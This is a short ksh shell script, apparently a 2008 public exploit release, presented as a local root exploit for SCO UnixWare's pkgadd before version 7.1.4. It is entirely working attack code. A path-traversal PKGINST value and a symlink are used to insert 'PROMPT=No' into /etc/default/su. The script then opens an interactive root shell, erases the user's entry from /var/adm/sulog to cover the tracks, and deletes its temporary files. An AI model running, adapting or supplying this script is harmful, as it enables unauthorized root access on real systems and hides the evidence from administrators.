#!/bin/ksh
#
# 04/2008: public release
# SCO UnixWare < 7.1.4 p534589
#
if [ `id -un` = 'root' ]; then
	grep -v " $1-root\$" /var/adm/sulog >su.log
	cp su.def /etc/default/su
	cp su.log /var/adm/sulog
	rm -f su.def su.log woot.log
else
	echo "------------------------------------"
	echo " UnixWare pkgadd Local Root Exploit"
	echo " By qaaz"
	echo "------------------------------------"
	EVIL=`echo 'XX\nPROMPT=No\nXX'`
	cp /etc/default/su su.def
	ln -s /etc/default/su woot.log
	PKGINST=../../../..`pwd`/woot /usr/sbin/pkgadd "$EVIL" 1>/dev/null 2>&1
	su root -c "$0 `id -un`; /bin/sh -i"
fi
